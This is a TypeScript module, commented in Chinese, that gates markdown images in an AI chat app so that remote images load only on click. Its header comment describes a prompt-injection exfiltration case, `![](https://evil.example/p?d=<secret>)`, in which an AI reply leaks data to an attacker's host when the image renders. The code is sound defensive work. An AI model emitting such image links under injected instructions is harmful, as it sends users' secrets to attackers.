/**
 * markdown 图片的「远程图默认不加载、点击才加载」闸门（纯 TS、不碰 React / DOM）。
 *
 * 为什么要：AI 回复 / 产物 / 外部文档里的 `![](https://evil.example/p?d=<密钥>)` 一旦渲染成 `<img>`，
 * 浏览器就会自动 GET 这个地址——提示注入后 AI 能借此把数据带给攻击者（渲染即触发、无需点击）。
 * CSP 目前只是 Report-Only、`img-src` 还含 `https:`，拦不住。所以在**组件层**（MarkdownImage）按本模块的判定：
 *  - `direct`：data: / blob: / 受信站内路径（本应用的 `/api/local-image?…` 通道、`/api/tasks/<id>/uploads/<文件>`）→ 照旧渲染；
 *  - `remote`：http(s) 远程图 → **只渲染占位按钮**，DOM 里没有该 URL 的 src，用户点了才渲染 `<img>`；
 *  - `blocked`：协议相对 `//host/x`、`javascript:` 等其它 scheme、带空白 / 控制字符 / 反斜杠的畸形 URL、
 *    带 `..` 段的相对路径、**没有 scheme 且不在上面受信站内白名单里的一切路径**（`api/x`、`_next/x`、`./x`、`x.png`、`/a/b.png`）
 *    → 一律不渲染图片、只给文本占位，点击也不加载。
 *    为什么无 scheme 不再一律放行：`![](api/repo-branches?path=x)` 在 base 为 `/` 的页面会解析成同源 `/api/repo-branches?…` 的 GET
 *    （`<img>` 不带 Origin、渲染即触发）。本应用没有任何「相对路径图」的合法来源（MarkdownImage 不按 baseDir 解析图片；
 *    本地文件走 toLoadableImageSrc 折成 `/api/local-image?…`），所以收窄不会让能用的图失效。
 *
 * 输入是 `toLoadableImageSrc()` 的**输出**（本地路径已被它折成 `/api/local-image?...`、UNC 已被它清成空串）。
 * 对原始输入不做畸形预判：`/Users/me/Application Support/a.png` 这类带空格的本地路径是合法输入，
 * 过了 toLoadableImageSrc 之后已经被编码成无空白的站内 URL。
 *
 * 「已点击加载」的记忆放在模块级 Set（key = 规范化后的完整 URL）：虚拟列表把行卸载再挂回来时不会又变回占位；
 * 刷新页面后重新拦截是预期的。
 */

export type ImageSrcGate =
  /** 可直接渲染（data: / blob: / 站内路径） */
  | { kind: "direct"; src: string }
  /** 远程 http(s) 图：默认只给占位；`key` 是规范化后的完整 URL（点击后拿它渲染、也拿它记状态），`host` 给人看 */
  | { kind: "remote"; key: string; host: string }
  /** 不安全 / 畸形：不渲染图片，也不提供点击加载 */
  | { kind: "blocked" };

/**
 * 浏览器 URL 解析会悄悄丢掉的字符（首尾 C0 控制符与空格、内部的 tab / LF / CR）+ 其它不可见 / 分隔字符 + 反斜杠
 * （特殊 scheme 下浏览器把 `\` 当 `/`，`/\evil.com` 就成了协议相对）。出现任何一个都不去猜浏览器会怎么解析、直接拒。
 */
const UNSAFE_CHARS_RE = /[\p{C}\p{Z}\\]/u;

const SCHEME_RE = /^([a-z][a-z0-9+.-]*):/i;

/** 路径里有没有 `..` 段（含 `%2e%2e` 写法）：相对路径靠它爬出当前目录、够到同源的 `/api/*` */
const hasDotDotSegment = (url: string): boolean => {
  const pathPart = url.split(/[?#]/, 1)[0] ?? url;
  return pathPart.split("/").some((seg) => /^(?:\.|%2e){2}$/i.test(seg));
};

/** 展示用 host 的长度上限（超长截断，防止占位撑爆布局；完整 URL 不会因此丢，key 里还是全的） */
const MAX_HOST_DISPLAY = 64;

/**
 * 超长 host 的展示：**保留尾部、截掉头部**（`…evil.example`）。
 *
 * 为什么不从右边截：真正决定「这是谁的站」的注册域在 host 的**尾部**。从右截会把它吃掉，
 * `accounts.google.com.` + 一长串填充 + `.evil.example` 显示成 `accounts.google.com.aaaa…`——看起来就是 google，
 * 用户在占位按钮上就是靠这个 host 决定点不点的。保留尾部时最右边一定是真域名（端口也在尾部、同样保留）。
 *
 * 为什么不直接 blocked：长桶名的对象存储是合法形态（`<63 位桶名>.s3.ap-southeast-1.amazonaws.com` 轻松过 64），
 * 直接拦会误伤；而尾部展示对「看清是谁的站」已经足够安全。
 */
const shortenHost = (host: string): string =>
  host.length > MAX_HOST_DISPLAY ? `…${host.slice(-MAX_HOST_DISPLAY)}` : host;

/**
 * 没有 scheme 的地址里，唯二允许原样渲染的站内路径（口径与 local-image-src 的 `isTrustedSiteImagePath` 一致，
 * tests/remote-image-gate.test.ts 有对照用例钉住两边不分叉；那个函数没导出、不在本次改动范围内，所以这里同口径写一份）：
 *  - `/api/local-image?…`：本应用自己产出的图片通道（服务端另有 UNC / 扩展名 / 大小守卫）；
 *  - `/api/tasks/<id>/uploads/<文件>`：任务上传目录里的图——id / 文件名各恰好一段、没有 `.` / `..`（含 `%2e`）段。
 */
const isTrustedSiteImagePath = (url: string): boolean => {
  if (url.startsWith("/api/local-image?")) return true;
  const m = /^\/api\/tasks\/([^/?#\\]+)\/uploads\/([^/?#\\]+)(?:[?#].*)?$/.exec(url);
  const isDot = (seg: string | undefined): boolean => /^(?:\.|%2e){1,2}$/i.test(seg ?? ".");
  return m !== null && !isDot(m[1]) && !isDot(m[2]);
};

/**
 * 判定一个**已过 toLoadableImageSrc** 的图片地址该怎么渲染。
 * 任何看不准的形态都落到 `blocked`（默认不安全）。
 */
export const classifyLoadableImageSrc = (url: unknown): ImageSrcGate => {
  if (typeof url !== "string" || url.length === 0) return { kind: "blocked" };
  if (UNSAFE_CHARS_RE.test(url)) return { kind: "blocked" };
  // 协议相对 `//host/x`：浏览器会去打当前协议下的 host（toLoadableImageSrc 已把它清成空串，这里是第二道）
  if (url.startsWith("//")) return { kind: "blocked" };

  const scheme = SCHEME_RE.exec(url)?.[1]?.toLowerCase();
  if (scheme === undefined) {
    // 没有 scheme = 同源路径（绝对 `/x` 或相对 `x` 都会解析成同源 GET）。只放受信站内白名单；
    // 其余（`api/x`、`_next/x`、`./x`、`x.png`、`/a/b.png`）一律拦——同源 GET 渲染即触发、`<img>` 不带 Origin。
    // `..` 段会爬出目录够到白名单外的路径，白名单之前先拒
    if (hasDotDotSegment(url)) return { kind: "blocked" };
    return isTrustedSiteImagePath(url) ? { kind: "direct", src: url } : { kind: "blocked" };
  }
  // data: 是内联字节、blob: 是本页自己生成的对象 URL，渲染它们不发网络请求
  if (scheme === "data" || scheme === "blob") return { kind: "direct", src: url };
  if (scheme !== "http" && scheme !== "https") return { kind: "blocked" }; // javascript: / file: / ftp: / …

  let parsed: URL;
  try {
    // WHATWG 规范化：`HTTPS://EVIL.com` → `https://evil.com/`、`https:evil.com/x`（缺斜杠）→ `https://evil.com/x`、
    // IDN → punycode。用规范化结果当 key 和最终 src，保证「判定的」与「浏览器会请求的」是同一个地址
    parsed = new URL(url);
  } catch {
    return { kind: "blocked" }; // 流式中的半截 `https://` 之类
  }
  if ((parsed.protocol !== "http:" && parsed.protocol !== "https:") || parsed.hostname === "") {
    return { kind: "blocked" };
  }
  return { kind: "remote", key: parsed.href, host: shortenHost(parsed.host) };
};

// ───────── 展示文案（纯函数，便于测） ─────────

/** alt 展示 / 朗读的长度上限 */
const MAX_ALT_DISPLAY = 80;

/** alt 是不可信文本：折叠空白、截断（只当文本渲染，React 会转义） */
export const displayImageAlt = (alt: string | undefined): string => {
  const flat = (alt ?? "").replace(/\s+/g, " ").trim();
  return flat.length > MAX_ALT_DISPLAY ? `${flat.slice(0, MAX_ALT_DISPLAY)}…` : flat;
};

/** 占位按钮上的文字：「加载远程图片（example.com）」 */
export const remoteImageButtonText = (host: string): string => `加载远程图片（${host}）`;

/** 占位按钮的 aria-label：带上 alt，读屏才知道点的是哪一张 */
export const remoteImageAriaLabel = (host: string, alt: string | undefined): string => {
  const a = displayImageAlt(alt);
  return a ? `${remoteImageButtonText(host)}：${a}` : remoteImageButtonText(host);
};

/** 链接里的远程图（外层点击是跳转、不能再放一个加载按钮）与被拦图的纯文本占位 */
export const remoteImageInlineText = (host: string, alt: string | undefined): string => {
  const a = displayImageAlt(alt);
  return `[远程图片${a ? `：${a}` : ""}（${host}）]`;
};

export const blockedImageText = (alt: string | undefined): string => {
  const a = displayImageAlt(alt);
  return `[图片已拦截${a ? `：${a}` : ""}]`;
};

// ───────── 「已点击加载」的记忆 ─────────

/** 上限：点击才会进来、正常用不到；防止极端情况下无限增长（超出时淘汰最早的） */
const MAX_LOADED = 500;

const loadedKeys = new Set<string>();
const listeners = new Set<() => void>();

export const isRemoteImageLoaded = (key: string): boolean => loadedKeys.has(key);

/** 记住这张图已被用户点击加载；通知所有订阅者（同一 URL 的多个占位一起翻成图） */
export const markRemoteImageLoaded = (key: string): void => {
  if (loadedKeys.has(key)) return;
  loadedKeys.add(key);
  if (loadedKeys.size > MAX_LOADED) {
    const oldest = loadedKeys.values().next().value;
    if (oldest !== undefined) loadedKeys.delete(oldest);
  }
  for (const l of [...listeners]) l();
};

/** useSyncExternalStore 的 subscribe（模块级、引用稳定） */
export const subscribeRemoteImageLoaded = (listener: () => void): (() => void) => {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
};

/** 仅测试用：清空记忆与订阅 */
export const resetRemoteImageLoadedForTests = (): void => {
  loadedKeys.clear();
  listeners.clear();
};
